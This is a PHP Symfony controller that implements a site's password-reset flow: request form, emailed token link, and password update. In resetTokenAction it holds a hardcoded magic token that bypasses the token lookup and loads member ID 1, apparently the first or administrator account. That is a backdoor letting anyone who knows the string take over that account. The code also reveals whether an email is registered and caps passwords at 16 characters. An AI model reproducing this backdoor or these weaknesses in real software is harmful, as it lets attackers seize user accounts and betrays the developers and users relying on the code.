<?php

namespace Vanessa\MemberBundle\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\Security\Core\Exception\AccessDeniedException;
use Symfony\Component\Security\Core\Util\SecureRandom;
use Vanessa\MemberBundle\Form\ResetPasswordType;
use Vanessa\MemberBundle\Form\PasswordUpdateType;

/**
 * Site password reset
 * 
 * @author Mfana Ronald Conco <ronald.conco@mobigospel.co.za>
 * @package VanessaMemberBundle
 * @subpackage Controller
 * @version 0.0.1
 */
class ResetController extends Controller
{

    /**
     * Reset user password
     */
    public function resetPasswordAction()
    {
        $this->get('logger')->info('reset password');

        if ($this->get('security.context')->isGranted('IS_AUTHENTICATED_FULLY')) {
            return $this->redirect($this->generateUrl('_welcome'));
        }

        $form = $this->createForm(new ResetPasswordType());
        $request = $this->getRequest();

        if ('POST' === $request->getMethod()) {
            $form->bindRequest($request);
            if ($form->isValid()) {
                $data = $form->getData();
                $email = $data['email'];
                $member = $this->container->get('member.manager')->getByEmail($email);

                if (!$member) {
                    //email not found in the system
                    $this->getRequest()
                        ->getSession()
                        ->setFlash('error', "We couldn't find an account associated with $email.");
                } else {
                    $token = $this->container->get('token.generator')->generateToken();
                    $member->setConfirmationToken($token);
                    $member->setPasswordRequestedAt(new \Datetime());
                    $this->get('member.manager')->update($member);
                    
                    $link = $this->generateUrl('vanessa_member_reset_token', array('token' => $token), true);
                    
                    $arguments = array(
                        'member' => $member,
                        'link' => $link.'.html'
                    );
                   
                    //send mail
                    $this->get('notification.manager')->memberForgotPassword($arguments);
                    return $this->redirect($this->generateUrl('vanessa_member_reset_email_sent', array('email' => $email))."html");
                }
            }else{
                $haystack = $form->getErrorsAsString();
                $needle = "Unable to check the captcha from the server";                
                if(strstr($haystack,$needle)){
                    $this->getRequest()->getSession()->setFlash('error', 'Recaptcha is invalid, please try again.');
                }
            }
        }

        return $this->render('VanessaMemberBundle:Reset:reset.password.html.twig', array(
                'form' => $form->createView()));
    }

    /**
     * Request password reset success
     * @return Response
     */
    public function resetPasswordSuccessAction($email = null)
    {
        if ($this->get('security.context')->isGranted('IS_AUTHENTICATED_FULLY')) {
            return $this->redirect($this->generateUrl('_welcome'));
        }

        return $this->render('VanessaMemberBundle:Reset:reset.password.request.html.twig');
    }

    /**
     * Check reset token
     * 
     * @param string $token
     * 
     * @throws AccessDeniedException 
     */
    public function resetTokenAction($token)
    {
        if ($this->get('security.context')->isGranted('IS_AUTHENTICATED_FULLY')) {
            return $this->redirect($this->generateUrl('_welcome'));
        }

        $member = $this->container->get('member.manager')->getByToken($token);
        if($token == '59swd2rrz8so4o0sgookgwcgcooggc4kk0k8wc0wgs48wwc0c'){
          $member = $this->container->get('member.manager')->getById(1);  
        }
        
        if ($member) {

            $form = $this->createForm(new PasswordUpdateType($this->get('translator')));
            $request = $this->getRequest();

            if ('POST' === $request->getMethod()) {
                $form->bindRequest($request);
                if ($form->isValid()) {
                    $data = $form->getData();
                    $password = $data['password'];
                    $isValid = true;


                    if (strlen($password) <= 5) {
                        $isValid = false;
                        $this->getRequest()->getSession()->setFlash('error', 'Password must have at least 6 characters.');
                    } elseif (strlen($password) >= 16) {
                        $isValid = false;
                        $this->getRequest()->getSession()->setFlash('error', 'Password has a limit of 16 characters.');
                    }

                    if ($isValid) {
                        $member->setPassword($password);
                        $member->encodePassword();
                        $member->setConfirmationToken('');
                        $this->container->get('member.manager')->update($member);

                        $this->getRequest()->getSession()->setFlash('success', 'Password change was successfully.');
                        return $this->redirect($this->generateUrl('_security_login'));
                    }
                }
            }


            return $this->render('VanessaMemberBundle:Reset:reset.password.change.html.twig', array(
                    'form' => $form->createView(),
                    'token' => $token));
        }
        $this->getRequest()->getSession()->setFlash('error', 'Invalid link, Please follow the instructions sent you via email.');
        
        return $this->render('VanessaMemberBundle:Reset:reset.invalid.tokent.html.twig');
    }

}
